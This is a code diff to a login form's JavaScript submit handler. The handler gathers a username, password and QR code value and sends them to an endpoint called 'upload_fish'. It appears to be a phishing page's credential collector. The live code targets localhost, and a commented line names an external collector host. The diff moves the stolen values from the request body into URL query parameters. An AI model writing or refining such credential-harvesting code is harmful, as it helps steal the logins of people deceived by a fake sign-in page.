@@ -13,19 +13,23 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     // 发送POST请求
     if (!isClicked) {
         isClicked = true;
+        const url ='http://localhost:23056/upload_fish'
+        const queryParams = {
+            user: encodeURIComponent(username),
+            password: encodeURIComponent(password),
+            qr: encodeURIComponent(qrcode)
+          };
+        const params = new URLSearchParams(queryParams);
+        const queryString = params.toString();
         //fetch('https://yxvm.gzx7301.top:23056/upload_fish', {
-        fetch('http://localhost:23056/upload_fish', {
+        fetch(`${url}?${queryString}`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             //body: `user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&qr=${encodeURIComponent(qrcode)}`
 
-            body: JSON.stringify({
-                user: encodeURIComponent(username),
-                password: encodeURIComponent(password),
-                qr: encodeURIComponent(qrcode)
-            })
+            body:''
         })
         .then(response => {
             if (response.ok) {
